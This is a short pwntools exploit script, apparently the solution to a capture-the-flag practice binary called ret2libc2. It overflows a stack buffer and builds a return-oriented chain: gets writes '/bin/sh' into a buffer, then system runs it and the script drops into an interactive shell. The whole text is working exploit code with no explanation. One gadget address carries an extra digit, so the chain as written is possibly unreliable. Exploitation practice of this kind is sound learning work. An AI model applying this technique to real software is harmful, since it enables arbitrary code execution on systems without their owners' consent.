from pwn import *

offset = 112

system_addr = 0x08048490
gets_addr = 0x08048460
buf2_addr = 0x0804a080
pop_addr = 0x00804872f


proc = process("./pwn/ret2libc2/ret2libc2")

proc.sendline(b'A'*offset \
        + p32(gets_addr) + p32(pop_addr)  + p32(buf2_addr) \
        + p32(system_addr) + b'AAAA' + p32(buf2_addr))
proc.sendline('/bin/sh')
proc.interactive()